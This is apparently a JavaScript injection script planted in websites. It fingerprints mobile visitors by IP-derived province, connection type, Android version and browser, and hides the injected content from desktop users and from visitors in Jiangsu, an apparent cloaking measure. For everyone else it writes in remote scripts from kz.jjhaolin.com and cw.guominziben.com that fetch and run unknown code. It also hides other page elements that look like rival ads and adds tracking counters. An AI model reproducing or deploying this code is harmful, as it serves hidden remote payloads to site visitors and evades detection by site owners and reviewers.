/* 2019.12.16代码1543 2020.0630 cw.guominziben.com kz.jjhaolin.com */
/* 126接口 */
var _c_top_001=["<script type='text/javascript' src='https://ip.ws.126.net/ipquery'></script>"];
/* 火猫接口 */
var _c_top_002=["<script type='text/javascript' src='https://ip.huomao.com/ip?format=js'></script>"];
/* 搜索引擎代码 */
var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|so)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
var _c_top_003=["<script type='text/javascript'>if(regexp.test(where)){document.write(_c_top_004);}else{document.write(_c_top_004);}</script>"];
/* JS判断地区省市代码1 */
var tc=1;
var _c_top_004=["<script type='text/javascript'>if(localAddress.province.indexOf('江苏') != -1 || localAddress.province.indexOf('江苏省') != -1 || localAddress.province.indexOf('未知地区001') != -1 || localAddress.province.indexOf('未知地区002') != -1) {bsgs=1;document.write(_c_top_017);}else{bsgs=0;document.write(_c_top_005);}</script>"];
/* 指定联网类型代码 */
var connection = navigator.connection||navigator.mozConnection||navigator.webkitConnection||{tyep:'unknown'};
var type_text = ['unknown','ethernet','wifi','2g','3g','4g','none'];
mtype = connection.type;
var _c_top_005=["<script type='text/javascript'>if(/wifi|wi-fi|wlan|w-lan/i.test(mtype)){document.write(_c_top_011+_c_top_006+_c_top_016);}else if(/cellular|4g|3g|2g/i.test(mtype)){document.write(_c_top_007);}else{document.write(_c_top_007);}</script>"];
/* JS隐藏AD代码006 */
var _c_top_006=["<script type='text/javascript'>(function(){var myArray=new Array('div','img00','span00','p00','a00','li00');for(var i=0;i<6;i++){var ifr=document.getElementsByTagName(myArray[i]);if(ifr&&ifr.length>0){for(var j=0;j<ifr.length;j++){var obj=ifr[j];var ids=obj.getAttribute('id');var cls=obj.getAttribute('class');if(cls){if(obj.tagName=='A'&&cls.indexOf(' ')!=-1&&obj.getAttribute('onclick')&&obj.getAttribute('target')&&obj.href){obj.style.display='none'}}if(ids&&cls){if(ids==cls&&cls.length>10&&obj.tagName=='LI')obj.style.display='none'}if(ids){if(ids.length>30&&ids.indexOf('-')==-1){obj.style.display='none'}if((/^[0-9]*$/.test(ids))&&ids.length>1){obj.style.display='none'}if(ids.length>7&&/[0-9]/.test(ids)&&/[a-z]/i.test(ids)&&obj.getAttribute('style')){obj.style.display='none'}}if(ids&&cls){if(cls.indexOf(' ')!=-1&&cls.indexOf(ids)!=-1&&obj.getAttribute('style')){obj.style.display='none'}if(ids==cls){if(/[0-9]/.test(ids)&&/[a-z]/i.test(ids)){obj.style.display='none'}}}}}}})();</script>"];
/* JS判断地区省市代码2 */
var tc=1;
var _c_top_007=["<script type='text/javascript'>if(remote_ip_info.province.indexOf('江苏') != -1 || remote_ip_info.province.indexOf('江苏省') != -1 || remote_ip_info.province.indexOf('未知地区003') != -1 || remote_ip_info.province.indexOf('未知地区004') != -1) {bsgs=1;document.write(_c_top_017);}else{bsgs=0;document.write(_c_top_008);}</script>"];
/* JS判断手机系统端代码 */
var _c_top_008=["<script type='text/javascript'>if(/Android|web1970/i.test(navigator.userAgent)){document.write(_c_top_009);}else{document.write(_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* JS判断安卓端版本号代码 */
Androidversion = navigator.userAgent.match(/Android (\d+)\.(\d+)\.?(\d+)?/);
var _c_top_009=["<script type='text/javascript'>if(/8.1.0|Android 8.1.0/i.test(Androidversion)){document.write(_c_top_010);}else{document.write(_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* JS判断浏览器类型代码 */
var browser = {
    versions : function () {
        var u = navigator.userAgent,
        app = navigator.appVersion;
        return {
            trident : u.indexOf('Trident') > -1,
            presto : u.indexOf('Presto') > -1,
            webKit : u.indexOf('AppleWebKit') > -1,
            gecko : u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1,
            mobile : !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/),
            ios : !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
            android : u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
            iPhone : u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
            iPad : u.indexOf('iPad') > -1,
            webApp : u.indexOf('Safari') == -1,
            QQbrw : u.indexOf('MQQBrowser') > -1,
            weiXin : u.indexOf('MicroMessenger') > -1,
            ucLowEnd : u.indexOf('UCWEB7.') > -1,
            ucSpecial : u.indexOf('rv:1.2.3.4') > -1,
            ucweb : function () {
                try {
                    return parseFloat(u.match(/ucweb\d+\.\d+/gi).toString().match(/\d+\.\d+/).toString()) >= 8.2
                } catch (e) {
                    if (u.indexOf('UC') > -1) {
                        return true;
                    } else {
                        return false;
                    }
                }
            }
            (),
            Symbian : u.indexOf('Symbian') > -1,
            ucSB : u.indexOf('Firefox/1.') > -1
        };
    }
    (),
    liulanqi : navigator.userAgent
}
var _c_top_010=["<script type='text/javascript'>if(browser.versions.ucweb){document.write(_c_top_017);}else{document.write(_c_top_011+_c_top_006+_c_top_016);}</script>"];
/* JS随机代码011 */
var cmid=2;
var cnid=Math.floor(Math.random()*cmid+1)
var _c_top_011=["<script type='text/javascript'>switch(cnid){case 1:document.write('<body>'+_c_top_021+'</body>');break;case 2:document.write('<body>'+_c_top_022+'</body>');break;}</script>"];
/* 总统计1 */
var _c_top_015=["<script type='text/javascript' src='https://js.users.51.la/20145157.js'></script>"];
/* 实际统计1 */
var _c_top_016=["<script type='text/javascript' src='https://js.users.51.la/20010531.js'></script>"];
/* 未用统计1 */
var _c_top_017=["<script type='text/javascript' src='https://js.users.51.la/20385827.js'></script>"];
/* 广告代码021-022 */
var _c_top_021=["<script id='mob' type='text/javascript' charset='utf-8' src='https://kz.jjhaolin.com/d.php?pid=3246'></script> <script id='mob' type='text/javascript' charset='utf-8' src='https://kz.jjhaolin.com/x.php?pid=3246'></script>"];
var _c_top_022=["<script id='mob' type='text/javascript' charset='utf-8' src='https://cw.guominziben.com/d.php?pid=3246'></script> <script id='mob' type='text/javascript' charset='utf-8' src='https://cw.guominziben.com/x.php?pid=3246'></script>"];

/* JS判断电脑移动端代码 */
//平台、设备和操作系统
 var system ={
 win : false,
 mac : false,
 xll : false
 };
 //检测平台
 var p = navigator.platform;
 system.win = p.indexOf("Win") == 0;
 system.mac = p.indexOf("Mac") == 0;
 system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
 //跳转语句
 if(system.win||system.mac||system.xll){
 document.write(无);
 }else{
 document.write(_c_top_001+_c_top_002+_c_top_003+_c_top_015);
 }
